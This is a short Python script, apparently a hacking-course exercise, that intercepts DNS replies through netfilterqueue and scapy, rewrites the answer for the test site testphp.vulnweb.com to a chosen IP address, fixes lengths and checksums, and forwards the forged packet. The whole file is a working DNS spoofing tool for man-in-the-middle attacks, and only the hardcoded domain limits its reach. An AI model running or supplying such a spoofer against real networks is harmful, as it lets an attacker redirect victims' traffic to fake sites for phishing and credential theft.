#!/usr/bin/env python
import scapy.all as scapy
import netfilterqueue 

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())   
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        # print("befor>>>\n",scapy_packet.show())
        if "testphp.vulnweb.com" in str(qname):
            answer = scapy.DNSRR(rrname=qname,rdata="157.240.250.35")
            scapy_packet[scapy.DNS].an =answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            # print("after >> ",scapy_packet.show2())
            print("[+] spoofed target.....")
            packet.set_payload(bytes(scapy_packet))
    packet.accept()


try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

except KeyboardInterrupt:
    print("\n[-] keyboard interrupted \nQutting.......")

